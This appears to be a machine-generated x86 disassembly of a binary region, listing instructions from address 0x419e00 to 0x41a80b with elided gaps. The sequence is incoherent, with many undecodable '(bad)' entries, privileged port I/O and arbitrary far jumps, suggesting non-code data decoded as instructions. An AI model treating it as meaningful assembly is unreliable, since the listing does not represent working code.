  419e00:	mov    ds:0x427bd081,al
  419e05:	cld    
  419e06:	mov    al,0xa6
  419e08:	fimul  DWORD PTR ds:0xf8ca183a
  419e0e:	loop   0x419e0c
  419e10:	and    eax,0x8d18d0b
  419e15:	aas    
  419e16:	out    dx,eax
  419e17:	rcl    bl,0xdb
  419e1a:	mov    esp,0x7aec5970
  419e1f:	push   eax
  419e20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e21:	dec    ebp
  419e22:	popf   
  419e23:	dec    edi
  419e24:	pop    ss
  419e25:	in     al,dx
  419e26:	mov    esp,0x5e452e4c
  419e2b:	jl     0x5c1d31ab
  419e31:	xchg   DWORD PTR [edx+0xa22b],esp
	...
  419e93:	add    BYTE PTR [eax],al
  419e95:	add    BYTE PTR [edi+0x5fc517d8],al
  419e9b:	iret   
  419e9c:	xlat   BYTE PTR ds:[ebx]
  419e9d:	fimul  DWORD PTR [eax-0x1eaf3a60]
  419ea3:	out    dx,al
  419ea4:	outs   dx,BYTE PTR ds:[esi]
  419ea5:	das    
  419ea6:	lods   eax,DWORD PTR ds:[esi]
  419ea7:	adc    BYTE PTR [ecx],al
  419ea9:	add    BYTE PTR [edi],al
  419eab:	add    DWORD PTR [eax],eax
  419ead:	add    BYTE PTR [esi-0x65990222],bh
  419eb3:	xchg   BYTE PTR [ebx-0x42],ah
  419eb6:	or     BYTE PTR ds:0xf508bea1,bl
  419ebc:	xchg   esi,eax
  419ebd:	push   ecx
  419ebe:	inc    eax
  419ebf:	aaa    
  419ec0:	dec    esp
  419ec1:	xchg   ebp,eax
  419ec2:	repnz or ah,BYTE PTR [edi+0x6d]
  419ec6:	sbb    bl,BYTE PTR [ebx-0x5d]
  419ec9:	cdq    
  419eca:	xchg   ebp,eax
  419ecb:	mov    ch,0x8d
  419ecd:	or     bh,BYTE PTR [edi+0x429908dd]
  419ed3:	mov    dl,0x6e
  419ed5:	sbb    al,BYTE PTR [ebp+0x7e]
  419ed8:	mov    BYTE PTR [ecx],ah
  419eda:	dec    edi
  419edb:	or     DWORD PTR [ebx],0xffffffdb
  419ede:	mov    ds:0xf4580559,al
  419ee3:	fadd   DWORD PTR [ebx-0x400467e5]
  419ee9:	repz pop ebx
  419eeb:	aas    
  419eec:	inc    esp
  419eed:	stc    
  419eee:	and    al,bl
  419ef0:	add    eax,0x15a9ef4e
  419ef5:	pop    esp
  419ef6:	sub    ch,BYTE PTR [ebp-0x7d]
  419ef9:	add    eax,DWORD PTR [esi-0x57]
  419efc:	out    dx,eax
  419efd:	outs   dx,DWORD PTR ds:[esi]
  419efe:	cmp    DWORD PTR [edx],0x7
  419f01:	inc    ebp
  419f02:	adc    bl,0xb1
  419f05:	nop
  419f06:	jb     0x419e9d
  419f08:	inc    ecx
  419f09:	dec    ebp
  419f0a:	mov    ecx,0xa1d22b0f
  419f0f:	outs   dx,BYTE PTR ss:[esi]
  419f11:	xchg   edi,eax
  419f12:	aas    
  419f13:	aaa    
  419f14:	bound  esp,QWORD PTR [edi]
  419f16:	arpl   WORD PTR [eax-0x28154d18],cx
  419f1c:	rcr    DWORD PTR [eax-0x2bf4aba3],0x12
  419f23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f24:	dec    eax
  419f25:	sbb    edx,DWORD PTR [esi+0x11]
  419f28:	arpl   WORD PTR [ecx-0x2],bx
  419f2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f2c:	gs pop ss
  419f2e:	(bad)  
  419f2f:	mov    ecx,0x5c8338d6
  419f34:	push   edx
  419f35:	ins    BYTE PTR es:[edi],dx
  419f36:	loopne 0x419fa9
  419f38:	in     eax,dx
  419f39:	push   esp
  419f3a:	dec    edx
  419f3b:	inc    edx
  419f3c:	mov    bl,0x6c
  419f3e:	adc    edi,edx
  419f40:	or     cl,BYTE PTR [edi-0x4c9277f]
  419f46:	frstor [ebx+0x1c4f9823]
  419f4c:	adc    DWORD PTR [ecx+0x58],edi
  419f4f:	sub    eax,0x625001f7
  419f54:	call   0x7a935f0c
  419f59:	clc    
  419f5a:	mov    ebp,0x68812ea3
  419f5f:	jl     0x419efc
  419f61:	and    al,0xb2
  419f63:	test   al,0xc
  419f65:	dec    ebp
  419f66:	mov    esp,0xd39bd202
  419f6b:	jg     0x419f86
  419f6d:	inc    DWORD PTR [ebx-0x3]
  419f70:	sub    ebp,esp
  419f72:	adc    eax,0xea3c5ef1
  419f77:	dec    ebp
  419f78:	xchg   ebx,eax
  419f79:	push   eax
  419f7a:	xchg   esi,eax
  419f7b:	not    DWORD PTR [ecx+0x2f]
  419f7e:	imul   ebx,DWORD PTR [ebp+0x6a5e0b15],0xd
  419f85:	xchg   BYTE PTR ds:0x2caf3c04,al
  419f8b:	ds sbb ch,dh
  419f8e:	leave  
  419f8f:	or     eax,0x15363228
  419f94:	mov    WORD PTR [esi+0x397f0712],?
  419f9a:	mov    ch,0x16
  419f9c:	ins    DWORD PTR es:[edi],dx
  419f9d:	xchg   edx,eax
  419f9e:	neg    ah
  419fa0:	test   al,0xa3
  419fa2:	sti    
  419fa3:	pop    ebp
  419fa4:	xor    ebp,DWORD PTR [ebp+0x13]
  419fa7:	or     eax,0x3f0b2065
  419fac:	test   al,0x26
  419fae:	jo     0x419f7a
  419fb0:	xor    BYTE PTR [ebp+0x4d0e69],dh
	...
  41a016:	dec    esi
  41a017:	jmp    0x41a043
  41a019:	dec    esi
  41a01a:	scas   eax,DWORD PTR es:[edi]
  41a01b:	iret   
  41a01c:	outs   dx,BYTE PTR ds:[esi]
  41a01d:	jmp    0x41a015
  41a01f:	in     al,dx
  41a020:	pop    ds
  41a021:	outs   dx,DWORD PTR ds:[esi]
  41a022:	dec    edx
  41a023:	pusha  
  41a024:	mov    ch,0x77
  41a026:	mov    ah,0x11
  41a028:	add    DWORD PTR [eax],eax
  41a02a:	pop    es
  41a02b:	add    DWORD PTR [eax],eax
  41a02d:	add    BYTE PTR [eax+0x7e],al
  41a030:	test   eax,0x13daa715
  41a035:	idiv   BYTE PTR [esi+0x4]
  41a038:	loopne 0x419fda
  41a03a:	imul   ebp,DWORD PTR [edx-0x2be94abd],0x5f
  41a041:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a042:	sub    DWORD PTR [esi-0x5fe04b16],eax
  41a048:	push   edi
  41a049:	imul   ebx,ebx,0x3b22e598
  41a04f:	loop   0x41a01e
  41a051:	test   BYTE PTR [ebx-0x58fde01d],al
  41a057:	mov    al,ds:0xc842f75
  41a05c:	dec    eax
  41a05d:	jmp    0x7293d636
  41a062:	adc    edx,DWORD PTR [ebp+0x63]
  41a065:	xor    ebx,0xd
  41a068:	mov    ds:0x77dfd9d6,al
  41a06d:	ins    DWORD PTR es:[edi],dx
  41a06e:	test   BYTE PTR [esp+ebx*4+0x50b7f0e],cl
  41a075:	jae    0x41a043
  41a077:	mov    ch,0x6d
  41a079:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a07a:	xor    BYTE PTR [ecx],bh
  41a07c:	sbb    ebx,eax
  41a07e:	and    al,0x9f
  41a080:	jbe    0x41a0dd
  41a082:	ror    DWORD PTR [edx],0xa1
  41a085:	(bad)  
  41a086:	jle    0x41a074
  41a088:	sbb    bh,BYTE PTR [ecx+0x24]
  41a08b:	sbb    ch,BYTE PTR [ebp-0x151344a6]
  41a091:	jp     0x41a104
  41a093:	push   esi
  41a094:	cld    
  41a095:	mov    WORD PTR [ebp+0x5c4c77ec],cs
  41a09b:	or     bl,bl
  41a09d:	add    DWORD PTR [edi-0x598e958a],0x5d06fb03
  41a0a7:	push   esp
  41a0a8:	pop    eax
  41a0a9:	leave  
  41a0aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0ab:	scas   al,BYTE PTR es:[edi]
  41a0ac:	mov    ?,eax
  41a0ae:	(bad)  
  41a0af:	pop    ecx
  41a0b0:	aad    0xbd
  41a0b2:	repnz mov ah,0xec
  41a0b5:	cs add esi,ebp
  41a0b8:	les    esi,FWORD PTR [ecx+0x2c3254e6]
  41a0be:	hlt    
  41a0bf:	popa   
  41a0c0:	pop    edx
  41a0c1:	adc    DWORD PTR [eax-0x12],edx
  41a0c4:	dec    ebp
  41a0c5:	aas    
  41a0c6:	dec    ebp
  41a0c7:	neg    DWORD PTR [eax+0x3785d457]
  41a0cd:	(bad)  
  41a0ce:	cmc    
  41a0cf:	mov    eax,ds:0x14105814
  41a0d4:	repz popf 
  41a0d6:	dec    edx
  41a0d7:	rcl    al,cl
  41a0d9:	fld    TBYTE PTR [ecx+eax*8+0x2342fbba]
  41a0e0:	push   esp
  41a0e1:	iret   
  41a0e2:	fidiv  WORD PTR [eax+0x25e9b1c6]
  41a0e8:	cmp    esi,DWORD PTR [edi+0x72]
  41a0eb:	sbb    BYTE PTR [ebx+0x75a86d9a],0x1c
  41a0f2:	push   ebp
  41a0f3:	adc    DWORD PTR [esi+0x27],0x7e
  41a0f7:	mov    eax,ds:0x511918ff
  41a0fc:	cmp    BYTE PTR [esi-0x57016793],bh
  41a102:	sub    DWORD PTR [ecx*1+0x7b4b27d2],esi
  41a109:	mov    esp,0x9f99eba0
  41a10e:	push   ds
  41a10f:	ja     0x41a16e
  41a111:	xchg   ebx,eax
  41a112:	xchg   edx,eax
  41a113:	ds inc esi
  41a115:	pop    eax
  41a116:	pusha  
  41a117:	aam    0x8d
  41a119:	ror    DWORD PTR [eax],0x8e
  41a11c:	mov    esp,DWORD PTR [esi-0x4f55c516]
  41a122:	xchg   ebx,eax
  41a123:	out    0x12,al
  41a125:	call   FWORD PTR [ecx-0x61]
  41a128:	les    edx,FWORD PTR [edx+0x34d114cc]
  41a12e:	ins    DWORD PTR es:[edi],dx
  41a12f:	cmovb  edx,DWORD PTR [esi-0x71]
  41a133:	push   0xffffffe6
	...
  41a195:	add    BYTE PTR [esp+ecx*1],bl
  41a198:	std    
  41a199:	sbb    ebp,edi
  41a19b:	stc    
  41a19c:	cld    
  41a19d:	or     eax,0xe0cd0383
  41a1a2:	jo     0x41a1c5
  41a1a4:	(bad)  
  41a1a5:	pop    esp
  41a1a6:	mov    ebx,0x7000112
  41a1ab:	add    DWORD PTR [eax],eax
  41a1ad:	add    BYTE PTR [ecx-0x2f0619f9],dh
  41a1b3:	or     BYTE PTR [esi+0x7a],al
  41a1b6:	jns    0x41a1e4
  41a1b8:	enter  0xa06a,0x33
  41a1bc:	sub    eax,0x5b48ed00
  41a1c1:	push   esi
  41a1c2:	outs   dx,DWORD PTR ds:[esi]
  41a1c3:	mov    ecx,0x54c07265
  41a1c8:	xor    al,0xe7
  41a1ca:	pop    ss
  41a1cb:	daa    
  41a1cc:	out    dx,eax
  41a1cd:	jo     0x41a1fb
  41a1cf:	jnp    0x41a1f8
  41a1d1:	mov    al,ds:0x2808d2db
  41a1d6:	jae    0x41a1fd
  41a1d8:	mov    esp,DWORD PTR [edi]
  41a1da:	aad    0x1e
  41a1dc:	ss xchg edi,eax
  41a1de:	test   eax,0xa68614d6
  41a1e3:	inc    esp
  41a1e4:	mov    dl,0xbd
  41a1e6:	adc    ecx,DWORD PTR [ecx+0x2701bc37]
  41a1ec:	dec    ebx
  41a1ed:	mov    ah,0xcd
  41a1ef:	mov    eax,ds:0xa26b1ca6
  41a1f4:	inc    edi
  41a1f5:	lock stos DWORD PTR es:[edi],eax
  41a1f7:	(bad)  
  41a1f9:	pop    esi
  41a1fa:	dec    edx
  41a1fb:	bound  ecx,QWORD PTR [edx+eiz*8+0x34473f32]
  41a202:	mov    esp,0xb3fa394c
  41a207:	and    ebp,DWORD PTR [ecx]
  41a209:	xor    eax,0xe595726e
  41a20e:	fwait
  41a20f:	iret   
  41a210:	cmovl  edx,DWORD PTR [edx+0x65]
  41a214:	fcmovbe st,st(1)
  41a216:	mov    edx,0x92b3e376
  41a21b:	inc    esi
  41a21c:	lea    esp,[ecx+ecx*8-0xd55c9e3]
  41a223:	imul   esi,edi,0xffffffd3
  41a226:	sahf   
  41a227:	test   BYTE PTR [edx+0x3fbdf02b],0x3b
  41a22e:	xor    al,0x26
  41a230:	mov    ah,BYTE PTR [ebx+ecx*1+0x66f8eecd]
  41a237:	(bad)  
  41a238:	sar    DWORD PTR [edx-0x7a],cl
  41a23b:	jge    0x41a21a
  41a23d:	iret   
  41a23e:	sbb    DWORD PTR [edi-0x74be62b],edi
  41a244:	push   ss
  41a245:	in     al,0xdd
  41a247:	loopne 0x41a20a
  41a249:	or     bl,BYTE PTR [ecx+0x4b029e80]
  41a24f:	cmp    DWORD PTR [edi+0x6b128427],edx
  41a255:	nop
  41a256:	jnp    0x41a25f
  41a258:	or     DWORD PTR [edx-0x379bc6d5],edi
  41a25e:	(bad)  
  41a25f:	push   eax
  41a260:	enter  0x8b35,0x3a
  41a264:	sahf   
  41a265:	add    ah,BYTE PTR [edi+0x6c543057]
  41a26b:	cmc    
  41a26c:	iret   
  41a26d:	mov    DWORD PTR [edi+esi*2-0x16],0x2a5411dc
  41a275:	inc    esp
  41a276:	xchg   ebx,eax
  41a277:	pop    ss
  41a278:	add    ecx,esp
  41a27a:	cdq    
  41a27b:	inc    edi
  41a27c:	xchg   ebp,eax
  41a27d:	mov    ds:0xc6c83f32,al
  41a282:	mov    dh,0x62
  41a284:	mov    DWORD PTR [ecx],ebx
  41a286:	pop    ebx
  41a287:	(bad)  
  41a288:	out    0xda,al
  41a28a:	and    ch,dh
  41a28c:	aam    0xc3
  41a28e:	adc    dh,BYTE PTR [ebp+0x44]
  41a291:	xchg   ecx,eax
  41a292:	and    eax,0xb65a2b37
  41a297:	inc    edx
  41a298:	jle    0x41a261
  41a29a:	xor    cl,BYTE PTR gs:[esi+0x57]
  41a29e:	inc    esi
  41a29f:	rol    dh,0xfe
  41a2a2:	mov    fs,WORD PTR [esi]
  41a2a4:	jns    0x41a2a6
  41a2a6:	mov    eax,ds:0x222a4e68
  41a2ab:	je     0x41a2bf
  41a2ad:	(bad)  
  41a2ae:	fstp   QWORD PTR [ecx+edi*1-0x80]
  41a2b2:	sub    dh,BYTE PTR [ebp+ecx*2+0x0]
	...
  41a315:	add    bh,dh
  41a317:	pop    eax
  41a318:	test   al,0x13
  41a31a:	scas   eax,DWORD PTR es:[edi]
  41a31b:	repz (bad) 
  41a31d:	cld    
  41a31e:	arpl   ax,bx
  41a320:	shl    DWORD PTR [eax-0x1e6d4122],0xc2
  41a327:	adc    eax,DWORD PTR [ecx]
  41a329:	add    BYTE PTR [edi],al
  41a32b:	add    DWORD PTR [eax],eax
  41a32d:	add    bh,dh
  41a32f:	shl    DWORD PTR [esp+ecx*8],1
  41a332:	push   ss
  41a333:	je     0x41a38a
  41a335:	inc    edx
  41a336:	daa    
  41a337:	sub    esi,DWORD PTR [ebx-0x7ff167e3]
  41a33d:	jne    0x41a333
  41a33f:	hlt    
  41a340:	sub    al,ch
  41a342:	adc    al,0x22
  41a344:	in     eax,0xcf
  41a346:	pop    ds
  41a347:	push   ds
  41a348:	iret   
  41a349:	jne    0x41a321
  41a34b:	or     edi,DWORD PTR [edx-0x41]
  41a34e:	or     BYTE PTR [eax],0xaf
  41a351:	imul   esi,DWORD PTR [edi+0x7d26cf24],0x3e
  41a358:	xchg   esi,eax
  41a359:	in     eax,dx
  41a35a:	xor    eax,0x112c7caf
  41a35f:	xchg   ebx,eax
  41a360:	pop    ebp
  41a361:	jne    0x41a3d6
  41a363:	add    cl,bh
  41a365:	xor    ebx,ebp
  41a367:	pop    ss
  41a368:	dec    DWORD PTR [edx]
  41a36a:	aad    0x63
  41a36c:	jnp    0x41a2fb
  41a36e:	std    
  41a36f:	out    dx,eax
  41a370:	fneni(8087 only) 
  41a372:	daa    
  41a373:	mov    al,ds:0xad24607
  41a378:	mov    edx,0x248aa
  41a37d:	fwait
  41a37e:	or     al,0xb3
  41a380:	inc    edi
  41a381:	xchg   edx,eax
  41a382:	(bad)  
  41a383:	jno    0x41a343
  41a385:	scas   eax,DWORD PTR es:[edi]
  41a386:	mov    cl,0xdf
  41a388:	cmp    eax,0x6eefbc8d
  41a38d:	pop    edi
  41a38e:	mov    dl,0x2d
  41a390:	push   eax
  41a391:	xor    BYTE PTR [edi],0x58
  41a394:	hlt    
  41a395:	leave  
  41a396:	cmp    al,0x14
  41a398:	sbb    al,0x20
  41a39a:	push   ds
  41a39b:	add    BYTE PTR [ecx],0x91
  41a39e:	popa   
  41a39f:	push   ecx
  41a3a0:	call   0xbb15:0xea125c23
  41a3a7:	ret    0x2ef9
  41a3aa:	dec    esp
  41a3ab:	sbb    ebx,ecx
  41a3ad:	push   edx
  41a3ae:	mov    ebp,eax
  41a3b0:	sbb    eax,0x641f20ea
  41a3b5:	ror    DWORD PTR [ebp-0x49],1
  41a3b8:	cmp    ch,0xca
  41a3bb:	push   ecx
  41a3bc:	shl    DWORD PTR [ebx+eiz*8-0x574e282e],1
  41a3c3:	aaa    
  41a3c4:	mov    edx,ecx
  41a3c6:	jno    0x41a3ff
  41a3c8:	scas   al,BYTE PTR es:[edi]
  41a3c9:	jnp    0x41a41e
  41a3cb:	sbb    cl,BYTE PTR [esi]
  41a3cd:	lods   eax,DWORD PTR ds:[esi]
  41a3ce:	push   ebx
  41a3cf:	push   ss
  41a3d0:	or     ebp,ecx
  41a3d2:	imul   esi,DWORD PTR [eax+0x57],0xa60cab54
  41a3d9:	inc    edi
  41a3da:	and    eax,0x2b069eb
  41a3df:	and    al,0x50
  41a3e1:	and    ebp,DWORD PTR [edx-0x54]
  41a3e4:	mov    ds:0x96edca6d,al
  41a3e9:	xchg   esi,eax
  41a3ea:	test   DWORD PTR [edx+0x2d],ebx
  41a3ed:	push   cs
  41a3ee:	mov    bh,0x3c
  41a3f0:	nop
  41a3f1:	inc    ebp
  41a3f2:	mov    WORD PTR [esi-0x6817b219],?
  41a3f8:	sbb    ebx,eax
  41a3fa:	inc    eax
  41a3fb:	imul   esp,DWORD PTR [ebx-0x50],0xffffffe1
  41a3ff:	sbb    DWORD PTR [ebp-0x7a036524],esi
  41a405:	jp     0x41a397
  41a407:	xor    ecx,DWORD PTR ds:0xfef98856
  41a40d:	xchg   DWORD PTR [ebp+ebx*1+0x30],esp
  41a411:	xor    al,0x3c
  41a413:	into   
  41a414:	dec    ecx
  41a415:	dec    edx
  41a416:	mov    dh,0x4c
  41a418:	push   0x6d
  41a41a:	inc    esp
  41a41b:	daa    
  41a41c:	cmp    DWORD PTR [edx+0xd],esi
  41a41f:	jle    0x41a3f2
  41a421:	in     eax,0x9d
  41a423:	dec    esi
  41a424:	ret    
  41a425:	mov    BYTE PTR [ebx],ch
  41a427:	rcr    DWORD PTR [esi],0x55
  41a42a:	xor    bl,BYTE PTR [ecx]
  41a42c:	aad    0xc1
  41a42e:	push   ebp
  41a42f:	lods   al,BYTE PTR ds:[esi]
  41a430:	cs repnz shl BYTE PTR ds:[ebp+0x0],0x0
	...
  41a496:	mov    edi,0xff0fcf82
  41a49b:	dec    edi
  41a49c:	push   DWORD PTR [edx+0x6df04d13]
  41a4a2:	dec    edx
  41a4a3:	jns    0x41a51c
  41a4a5:	inc    esi
  41a4a6:	leave  
  41a4a7:	adc    al,0x1
  41a4a9:	add    BYTE PTR [edi],al
  41a4ab:	add    DWORD PTR [eax],eax
  41a4ad:	add    BYTE PTR ds:0xf0c280bc,dl
  41a4b3:	add    eax,0xfa7e4ff9
  41a4b9:	fdivr  QWORD PTR [ebx+ebx*1]
  41a4bc:	out    0xfc,al
  41a4be:	adc    al,0x4d
  41a4c0:	mov    edx,0x716aa578
  41a4c5:	sub    DWORD PTR [ebx-0x4c6c0a90],ecx
  41a4cb:	push   ecx
  41a4cc:	push   ebp
  41a4cd:	dec    edx
  41a4ce:	cdq    
  41a4cf:	imul   ebx,eax,0xf8e18c4e
  41a4d5:	dec    ecx
  41a4d6:	scas   al,BYTE PTR es:[edi]
  41a4d7:	push   edi
  41a4d8:	fistp  QWORD PTR [esi-0x71]
  41a4db:	push   ebp
  41a4dc:	inc    ebx
  41a4dd:	ficom  WORD PTR [ebp-0x71f45cae]
  41a4e3:	punpcklwd mm7,DWORD PTR [edi]
  41a4e6:	sub    BYTE PTR [eax+0x132798e3],dh
  41a4ec:	xor    esp,0x65
  41a4ef:	mov    ebx,edx
  41a4f1:	push   0x26b31c3c
  41a4f6:	nop
  41a4f7:	xchg   esi,eax
  41a4f8:	mov    cl,BYTE PTR [ecx]
  41a4fa:	and    al,0x3c
  41a4fc:	cs pop ebp
  41a4fe:	mov    edi,esi
  41a500:	xor    ebp,DWORD PTR [edx-0x7e]
  41a503:	test   BYTE PTR [edx+0x2e],bh
  41a506:	(bad)  
  41a507:	and    BYTE PTR [edx-0x2ae9fe36],dh
  41a50d:	hlt    
  41a50e:	jmp    0x77842336
  41a513:	dec    ebp
  41a514:	xor    al,0x11
  41a516:	je     0x41a509
  41a518:	lods   al,BYTE PTR ds:[esi]
  41a519:	xor    esp,DWORD PTR [esi+0x4b]
  41a51c:	xchg   ebx,eax
  41a51d:	cld    
  41a51e:	dec    eax
  41a51f:	retf   
  41a520:	mov    edi,0x95d4e363
  41a525:	and    eax,0x715c7b6b
  41a52a:	pop    edx
  41a52b:	xor    BYTE PTR ds:0x102c279f,ch
  41a531:	fbld   TBYTE PTR [eax+0x7d401eff]
  41a537:	push   esi
  41a538:	je     0x41a50c
  41a53a:	or     eax,0x4cc7fcaa
  41a53f:	aad    0xf0
  41a541:	test   eax,0x1716a1fa
  41a546:	mov    cl,0xe
  41a548:	mov    eax,ds:0x7842f1d8
  41a54d:	fisubr DWORD PTR [edx-0x1b]
  41a550:	jo     0x41a58f
  41a552:	pusha  
  41a553:	jo     0x41a5b5
  41a555:	xchg   ebp,eax
  41a556:	jno    0x41a4eb
  41a558:	mov    al,BYTE PTR [edx]
  41a55a:	ror    BYTE PTR [eax+0x28],cl
  41a55d:	arpl   di,bp
  41a55f:	scas   al,BYTE PTR es:[edi]
  41a560:	(bad)  
  41a561:	fcmovnb st,st(0)
  41a563:	call   0x89b9:0x5491860a
  41a56a:	add    BYTE PTR ds:0x9866dc3c,dh
  41a570:	push   ebx
  41a571:	(bad)  
  41a572:	int    0x23
  41a574:	repnz popa 
  41a576:	mov    al,0x6f
  41a578:	inc    esp
  41a579:	lahf   
  41a57a:	enter  0xc621,0xa4
  41a57e:	push   0xffffffc9
  41a580:	or     al,0x65
  41a583:	lea    ecx,[edi-0x6]
  41a586:	cdq    
  41a587:	in     eax,dx
  41a588:	mov    esi,0x4ab09a50
  41a58d:	push   0xd27f0421
  41a592:	inc    esp
  41a593:	jbe    0x41a602
  41a595:	iret   
  41a596:	and    al,0x92
  41a599:	rcr    BYTE PTR [ecx],cl
  41a59b:	cmp    eax,0xd63ad9a0
  41a5a0:	das    
  41a5a1:	add    DWORD PTR [ebx+0x1a0e808c],edx
  41a5a7:	mov    esp,0x3b0d7791
  41a5ac:	jmp    0x87319d8c
  41a5b1:	in     al,dx
  41a5b2:	jecxz  0x41a56a
  41a5b4:	loop   0x41a5b6
	...
  41a616:	pop    esp
  41a617:	sub    al,BYTE PTR [ecx]
  41a619:	inc    ecx
  41a61a:	ja     0x41a687
  41a61c:	pop    esp
  41a61d:	aas    
  41a61e:	pop    ecx
  41a61f:	jmp    0x41a5e9
  41a621:	mov    edx,0x52e9645d
  41a626:	rcl    BYTE PTR ds:0x1070001,1
  41a62c:	add    BYTE PTR [eax],al
  41a62e:	int    0x18
  41a630:	fs iret 
  41a632:	push   edi
  41a633:	jnp    0x41a5e6
  41a635:	fld    st(1)
  41a637:	sub    esi,DWORD PTR [edi+0x4f1ad4e3]
  41a63d:	cmp    edi,DWORD PTR [edx-0x29ea7ff9]
  41a643:	bnd js 0x41a684
  41a646:	mov    ch,0x27
  41a648:	xlat   BYTE PTR ds:[ebx]
  41a649:	je     0x41a68e
  41a64b:	dec    DWORD PTR [ecx+0x46695dab]
  41a651:	sbb    ch,ch
  41a653:	inc    edi
  41a654:	inc    eax
  41a655:	(bad)  
  41a657:	push   cs
  41a658:	or     eax,0x9488df33
  41a65d:	adc    eax,0x3c5f6562
  41a662:	(bad)  [edx+0x79b5d53b]
  41a668:	mov    eax,ds:0x59d0b7c5
  41a66d:	dec    eax
  41a66e:	pushf  
  41a66f:	loop   0x41a604
  41a671:	push   edx
  41a672:	xor    al,0x97
  41a674:	and    ebp,ebx
  41a676:	(bad)  
  41a677:	or     ebx,esp
  41a679:	icebp  
  41a67a:	push   edx
  41a67b:	das    
  41a67c:	and    al,0x3a
  41a67e:	das    
  41a67f:	jo     0x41a6b1
  41a681:	inc    ecx
  41a682:	ins    DWORD PTR es:[edi],dx
  41a683:	xchg   edx,eax
  41a684:	sbb    eax,0x17aeae20
  41a689:	jp     0x41a6d1
  41a68b:	xchg   ebx,eax
  41a68c:	fbstp  TBYTE PTR [eax-0x7fa19987]
  41a692:	cmc    
  41a693:	cmp    al,0x44
  41a695:	jo     0x41a69f
  41a697:	xlat   BYTE PTR ds:[ebx]
  41a698:	popa   
  41a699:	in     al,0x21
  41a69b:	mov    cs,WORD PTR [edi]
  41a69d:	daa    
  41a69e:	loope  0x41a6f9
  41a6a0:	add    eax,0xfe30eacc
  41a6a5:	jnp    0x41a71e
  41a6a7:	push   esi
  41a6a8:	cmp    DWORD PTR [ebx-0x2e],ebx
  41a6ab:	test   BYTE PTR [edi],0x10
  41a6ae:	pop    edi
  41a6af:	ret    
  41a6b0:	cs in  al,0xd7
  41a6b3:	jle    0x41a691
  41a6b5:	pop    ebx
  41a6b6:	jecxz  0x41a662
  41a6b8:	ror    DWORD PTR [edx],1
  41a6ba:	pop    es
  41a6bb:	sbb    BYTE PTR [edx-0x7c],dl
  41a6be:	in     al,0xfd
  41a6c0:	and    eax,0x6bc27eab
  41a6c5:	inc    eax
  41a6c6:	xor    ebp,DWORD PTR [ebp-0x36]
  41a6c9:	sbb    DWORD PTR [ebx-0x102bd2d],eax
  41a6cf:	sub    eax,DWORD PTR fs:[ebx+0x6c]
  41a6d3:	or     al,0x53
  41a6d5:	cmp    esp,edi
  41a6d7:	in     eax,0x47
  41a6d9:	test   BYTE PTR [ebp+0x3],cl
  41a6dc:	nop
  41a6dd:	jle    0x41a740
  41a6df:	pop    ebp
  41a6e0:	fcom   DWORD PTR [eax]
  41a6e2:	(bad)  
  41a6e3:	stos   DWORD PTR es:[edi],eax
  41a6e4:	sbb    eax,0xf678e532
  41a6e9:	fwait
  41a6ea:	test   al,0xcf
  41a6ec:	into   
  41a6ed:	ficomp DWORD PTR [ecx+0x6969d81c]
  41a6f3:	inc    edx
  41a6f4:	adc    BYTE PTR [eax],dl
  41a6f6:	push   esi
  41a6f7:	jmp    0x6886:0xd17f0376
  41a6fe:	(bad)  
  41a6ff:	cmc    
  41a700:	or     ebp,edi
  41a702:	mov    ah,0xc5
  41a704:	fnstsw WORD PTR [ebp+0x60]
  41a707:	std    
  41a708:	push   ds
  41a709:	sub    ecx,DWORD PTR [eax+ebp*8+0x1b]
  41a70d:	cmp    eax,0x26cf7dd9
  41a712:	push   edi
  41a713:	mov    ch,0x42
  41a715:	dec    ebp
  41a716:	arpl   WORD PTR [eax-0x7f],dx
  41a719:	ins    BYTE PTR es:[edi],dx
  41a71a:	in     eax,0x95
  41a71c:	test   DWORD PTR ds:0xe67754af,esi
  41a722:	stos   BYTE PTR es:[edi],al
  41a723:	stc    
  41a724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a725:	xchg   ebx,eax
  41a726:	push   ds
  41a727:	ficomp DWORD PTR [eax+0x10ec6fe6]
  41a72d:	cli    
  41a72e:	push   cs
  41a72f:	mov    esp,0xf26ee903
  41a734:	sbb    DWORD PTR [eax],eax
	...
  41a796:	repz xchg edi,eax
  41a798:	jae    0x41a721
  41a79a:	ja     0x41a783
  41a79c:	div    edi
  41a79e:	fisttp QWORD PTR [ebx-0x2868af58]
  41a7a4:	jg     0x41a81d
  41a7a6:	xlat   BYTE PTR ds:[ebx]
  41a7a7:	push   ss
  41a7a8:	add    DWORD PTR [eax],eax
  41a7aa:	pop    es
  41a7ab:	add    DWORD PTR [eax],eax
  41a7ad:	add    al,dh
  41a7af:	cmp    eax,0x1b610468
  41a7b4:	aam    0x6f
  41a7b6:	dec    eax
  41a7b7:	or     al,0xce
  41a7b9:	mov    ebx,0xc99bd001
  41a7be:	sahf   
  41a7bf:	sti    
  41a7c0:	pop    eax
  41a7c1:	scas   eax,DWORD PTR es:[edi]
  41a7c2:	or     al,0x11
  41a7c4:	adc    edx,DWORD PTR [esi]
  41a7c6:	push   ds
  41a7c7:	(bad)  
  41a7c9:	aaa    
  41a7ca:	xchg   ebp,eax
  41a7cb:	mov    ebx,0x1de6fb93
  41a7d0:	sti    
  41a7d1:	sbb    ch,0xdd
  41a7d4:	loopne 0x41a801
  41a7d6:	lods   eax,DWORD PTR ds:[esi]
  41a7d7:	lahf   
  41a7d8:	je     0x41a7dc
  41a7da:	pop    ecx
  41a7db:	jmp    0xb9fe:0x4f8a0af7
  41a7e2:	dec    edx
  41a7e3:	out    dx,al
  41a7e4:	leave  
  41a7e5:	jnp    0x41a7de
  41a7e7:	push   edi
  41a7e8:	sahf   
  41a7e9:	xor    bl,BYTE PTR [edx+0x6b]
  41a7ec:	mov    ds:0xf353f42a,eax
  41a7f1:	iret   
  41a7f2:	out    0x3f,al
  41a7f4:	sbb    BYTE PTR [edi-0x3a93e5fb],0xc3
  41a7fb:	or     al,0xf
  41a7fd:	xchg   ebp,eax
  41a7fe:	jbe    0x41a78b
  41a800:	fs jo  0x41a802
  41a803:	sti    
  41a804:	dec    esp
  41a805:	cld    
  41a806:	mov    edx,0xd4b953da
  41a80b:	call   DWORD PTR [edi-0x5db96b83]
